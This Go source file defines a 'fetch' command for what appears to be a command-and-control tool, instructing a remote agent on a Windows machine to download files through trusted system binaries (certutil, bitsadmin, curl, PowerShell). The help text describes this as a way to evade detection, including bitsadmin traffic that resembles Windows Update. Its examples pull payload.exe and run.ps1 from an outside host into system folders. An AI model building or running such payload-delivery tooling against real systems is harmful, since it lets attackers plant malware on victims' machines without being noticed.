package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"os"

	"github.com/spf13/cobra"
)

var fetchCmd = &cobra.Command{
	Use:   "fetch <agent-id> <url> <remote-path>",
	Short: "Download a file on the agent via LOLBin (certutil/bitsadmin/curl/powershell)",
	Long: `Tell the agent to download a file from an arbitrary URL using a trusted Windows binary.

This avoids initiating the download from the agent process directly — instead, a
native Windows LOLBin (Living-off-the-Land Binary) makes the network request.

Available methods:
  certutil   — certutil.exe -urlcache -split -f <url> <dest>   (default, works on all Windows)
  bitsadmin  — BITS transfer job; traffic resembles Windows Update
  curl       — curl.exe (Windows 10 1803+ native)
  powershell — System.Net.WebClient.DownloadFile

Examples:
  fetch 7d019eb7 http://192.168.1.10/payload.exe "C:\Windows\Temp\svc.exe"
  fetch 7d019eb7 http://192.168.1.10/run.ps1 "C:\ProgramData\run.ps1" --method powershell
  fetch 7d019eb7 http://192.168.1.10/tool.exe "C:\Users\Public\tool.exe" --method bitsadmin --wait`,
	Args: cobra.ExactArgs(3),
	Run: func(cmd *cobra.Command, args []string) {
		agentID, err := resolveAgentID(args[0])
		if err != nil {
			printError(err.Error())
			os.Exit(1)
		}
		url := args[1]
		remotePath := args[2]

		method, _ := cmd.Flags().GetString("method")
		wait, _ := cmd.Flags().GetBool("wait")
		timeout, _ := cmd.Flags().GetInt("timeout")

		payload, _ := json.Marshal(map[string]interface{}{
			"url":         url,
			"destination": remotePath,
			"method":      method,
			"timeout":     timeout,
		})
		body, err := makeAPIRequestWithMethod("POST",
			"/api/v1/agent/"+agentID+"/fetch",
			bytes.NewBuffer(payload), "application/json")
		if err != nil {
			printError(fmt.Sprintf("Fetch failed: %v", err))
			os.Exit(1)
		}
		var resp APIResponse
		if err := json.Unmarshal(body, &resp); err != nil || !resp.Success {
			msg := "unknown error"
			if resp.Error != "" {
				msg = resp.Error
			}
			printError(fmt.Sprintf("Fetch failed: %s", msg))
			os.Exit(1)
		}

		dataMap, _ := resp.Data.(map[string]interface{})
		cmdID, _ := dataMap["command_id"].(string)
		usedMethod, _ := dataMap["method"].(string)

		printSuccess(fmt.Sprintf("Fetch queued via %s → %s", usedMethod, remotePath))

		if wait && cmdID != "" {
			printInfo(fmt.Sprintf("Waiting for result (timeout %ds)...", timeout))
			if finalData, ok := waitForCommand(cmdID, timeout).(map[string]interface{}); ok {
				displayFinalCommandStatus(finalData, cmdID)
			}
		} else if cmdID != "" {
			printInfo(fmt.Sprintf("command_id: %s", cmdID))
		}
	},
}
